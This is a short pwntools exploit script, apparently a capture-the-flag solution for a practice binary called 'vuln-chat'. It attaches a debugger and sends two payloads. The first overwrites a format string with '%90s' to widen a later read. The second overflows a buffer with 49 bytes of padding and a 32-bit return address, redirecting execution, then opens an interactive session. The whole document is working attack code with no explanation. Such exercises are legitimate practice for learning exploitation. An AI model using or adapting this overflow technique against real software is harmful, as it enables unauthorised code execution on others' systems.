from pwn import *

p = process("./vuln-chat")
gdb.attach(p,gdbscript='break main')
pay1 = b"a"*20+b"%90s"
p.sendline(pay1)
pay2 = b"c"*49 + p32(0x804856b)

p.sendline(pay2)
p.interactive()
